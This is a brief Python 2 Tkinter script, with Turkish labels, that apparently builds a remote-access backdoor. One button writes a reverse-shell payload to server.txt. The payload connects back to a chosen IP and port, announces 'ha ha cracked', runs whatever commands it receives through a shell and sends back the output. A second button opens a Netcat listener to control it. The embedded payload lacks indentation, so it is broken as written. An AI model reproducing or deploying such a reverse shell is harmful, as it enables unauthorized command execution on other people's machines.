# -*- coding: cp1254 -*-
from Tkinter import *
from netcat import Netcat
def server():
    dosya = open("server.txt", "a")
    dosya.write("#!/usr/bin/python\nimport socket\nimport subprocess\nhost = 'ip'\nport = port\ns = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((host,port))\ns.send('ha ha cracked')\nwhile True:\nveri = s.recv(1024)\nislem = subprocess.Popen(veri, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)\nislem_verileri = islem.stdout.read() + islem.stderr.read()\ns.send(islem_verileri)\ns.close()")
    dosya.close()
    print"server olusturludu"

def listen():
    ip = raw_input("tırnak icinde ip adresi gir:")
    port = raw_input("port gir:")
    nc = Netcat(ip, port)
    nc.read_until('>')
    nc.write('new' + '\n')
    nc.read_until('>')
    nc.write('set' + '\n')
    nc.read_until('id:')

pencere = Tk()
cerceve1 = Frame(pencere)
cerceve1.pack()

cerceve2 = Frame(pencere)

cerceve2.pack(side =BOTTOM)

button1 = Button(cerceve1,text= "server olustur", command = server)

button2 = Button(cerceve1,text= "port dinle", command = listen)

button1.pack()

button2.pack()


pencere.mainloop()
